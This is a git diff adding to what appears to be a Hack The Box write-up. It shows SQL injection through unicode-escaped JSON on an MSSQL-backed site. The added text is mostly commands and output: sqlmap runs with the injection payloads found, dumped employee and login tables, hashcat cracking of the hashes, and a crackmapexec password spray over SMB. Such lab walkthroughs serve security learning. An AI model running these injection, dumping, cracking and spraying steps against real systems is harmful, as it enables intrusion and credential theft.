@@ -243,7 +243,7 @@ Requests/sec.: 0
   - I have never seen it before
   - It means that `the content to be in JSON format, encoded in the UTF-8 character encoding.`
     - https://stackoverflow.com/questions/9254891/what-does-content-type-application-json-charset-utf-8-really-mean
-  - So if we send `\u27`, which is ASCII value of `'`, we receive `500`
+  - So if we send `\u27`, which is ASCII value of `'`, we receive `500``
   - Possibly indicating that there's an `sqli` 
 
 ![](./images/4.png)
@@ -254,8 +254,165 @@ Requests/sec.: 0
   - In case I don't have anything, I'll run `sqlmap` with different parameters
 
 ```
+└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.7.9#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 14:34:33 /2023-10-13/
+
+[14:34:33] [INFO] parsing HTTP request from 'sqli.req'
+[14:34:33] [INFO] loading tamper module 'charunicodeescape'
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[14:34:33] [INFO] testing connection to the target URL
+...
+(custom) POST parameter 'JSON name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 466 HTTP(s) requests:
+---
+Parameter: JSON name ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: {"name":"\u27' OR NOT 5590=5590-- bkOY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"name":"\u27';WAITFOR DELAY '0:0:5'--"}
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase time-based blind (IF)
+    Payload: {"name":"\u27' WAITFOR DELAY '0:0:5'-- Wvdt"}
+---
+[15:57:00] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[15:57:00] [INFO] testing Microsoft SQL Server
+[15:57:05] [INFO] confirming Microsoft SQL Server
+[15:57:27] [INFO] the back-end DBMS is Microsoft SQL Server
+web server operating system: Windows 10 or 2022 or 2016 or 11 or 2019
+web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 10.0
+back-end DBMS: Microsoft SQL Server 2017
+[15:57:27] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2 times
+[15:57:27] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.10.179'
+
+[*] ending @ 15:57:27 /2023-10-13/
 
 ```
+
+- Let's dump the databases
+```
+└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql --dbs
+...
+[17:13:49] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+available databases [4]:
+[*] Hub_DB
+[*] [master]
+[*] model
+[*] msdb
+[*] tempdb
+```
+```
+└─$ sqlmap -r sqli.req --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --dbms=mssql --exclude-sysdbs --dump-all
+...
+Database: Hub_DB                                           
+Table: Colleagues                                          
+[17 entries]                                               
++------+----------------------+-------------+----------------------+----------------------+
+| id   | email                | image       | name                 | position             |
++------+----------------------+-------------+----------------------+----------------------+
+| 1    | sbauer@megacorp.htb  | sbauer.jpg  | Sarina Bauer         | Junior Developer     |
+| 2    | okent@megacorp.htb   | okent.jpg   | Octavia Kent         | Senior Consultant    |
+| 3    | ckane@megacorp.htb   | ckane.jpg   | Christian Kane       | Assistant Manager    |
+| 4    | kpage@megacorp.htb   | kpage.jpg   | Kimberly Page        | Financial Analyst    |
+| 5    | shayna@megacorp.htb  | shayna.jpg  | Shayna Stafford      | HR Manager           |
+| 6    | james@megacorp.htb   | james.jpg   | James Houston        | QA Lead              |
+| 7    | cyork@megacorp.htb   | cyork.jpg   | Connor York          | Web Developer        |
+| 8    | rmartin@megacorp.htb | rmartin.jpg | Reya Martin          | Tech Support         |
+| 9    | zac@magacorp.htb     | zac.jpg     | Zac Curtis           | Junior Analyst       |
+| 10   | jorden@megacorp.htb  | jorden.jpg  | Jorden Mclean        | Full-Stack Developer |
+| 11   | alyx@megacorp.htb    | alyx.jpg    | Alyx Walters         | Automation Engineer  |
+| 12   | ilee@megacorp.htb    | ilee.jpg    | Ian Lee              | Internal Auditor     |
+| 13   | nbourne@megacorp.htb | nbourne.jpg | Nikola Bourne        | Head of Accounts     |
+| 14   | zpowers@megacorp.htb | zpowers.jpg | Zachery Powers       | Credit Analyst       |
+| 15   | aldom@megacorp.htb   | aldom.jpg   | Alessandro Dominguez | Senior Web Developer |
+| 16   | minato@megacorp.htb  | minato.jpg  | MinatoTW             | CEO                  |
+| 17   | egre55@megacorp.htb  | egre55.jpg  | egre55               | CEO                  |
++------+----------------------+-------------+----------------------+----------------------+
+...
+Database: Hub_DB 
+Table: Logins                                              
+[17 entries]
++------+----------+--------------------------------------------------------------------------------------------------+
+| id   | username | password                                                                                         |
++------+----------+--------------------------------------------------------------------------------------------------+
+| 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 2    | okent    | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 3    | ckane    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 4    | kpage    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 5    | shayna   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 6    | james    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 7    | cyork    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 8    | rmartin  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 9    | zac      | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 10   | jorden   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 11   | alyx     | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 12   | ilee     | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 13   | nbourne  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
+| 14   | zpowers  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
+| 15   | aldom    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
+| 16   | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
+| 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
++------+----------+--------------------------------------------------------------------------------------------------+
+...
+```
+
+- Let's crack the hashes
+```
+└─$ hashcat -m 17900 hash /usr/share/wordlists/rockyou.txt --force 
+hashcat (v6.2.6) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+...
+
+9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
+68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
+fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
+...
+```
+
+- Looks like we have following creds
+```
+password1 - sbauer, shayna, james, cyork, jorden, aldom
+finance1 - ckane, kpage, zac, ilee, zpowers
+banking1 - okent, rmartin, alyx, nbourne
+```
+
+- Testing for validity of the accounts shows nothing
+```
+└─$ crackmapexec smb 10.10.10.179 -u users.list -p passwords.list 
+SMB         10.10.10.179    445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True)
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\sbauer:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\okent:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\ckane:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:password1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:finance1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\kpage:banking1 STATUS_LOGON_FAILURE 
+SMB         10.10.10.179    445    MULTIMASTER      [-] MEGACORP.LOCAL\shayna:password1 STATUS_LOGON_FAILURE
+...
+```
+
+
 ## User
 
 
